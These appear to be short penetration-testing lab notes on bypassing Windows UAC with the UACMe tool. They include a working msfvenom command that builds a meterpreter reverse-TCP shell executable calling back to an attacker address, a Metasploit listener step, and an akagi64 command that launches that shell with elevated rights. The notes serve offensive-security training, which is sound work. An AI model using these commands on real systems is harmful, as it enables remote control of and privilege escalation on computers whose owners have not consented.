UACMe is the tool we plan to use for this.

https://github.com/hfiref0x/UACME

Can be used to escalate priveleges or change a user's password by bypassing UAC.

Requires a user account that is already a user in the local administrator's group. UAC has verious integrity levels from Low to High. Programs can be executed with elevated privs without prompting the use for confirmation.

UAC depends on the version of windows, and the level of integrity applied to UAC.

UACMe is a tool and list of resources that can be used to bypass UAC. We will be using primarily akagi32

**Practical notes**

Confirm you are in local administrators group.

msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip.addr LPORT=1337 -f exe > shell.exe

use multi/handler ( specify the payload you chose with msfvenom )

.\akagi64.exe ( number ) c:\Temp\shell.exe

NOTE FROM LABS: Always try to upgrade your shell to 64 bit on 64 bit computers.

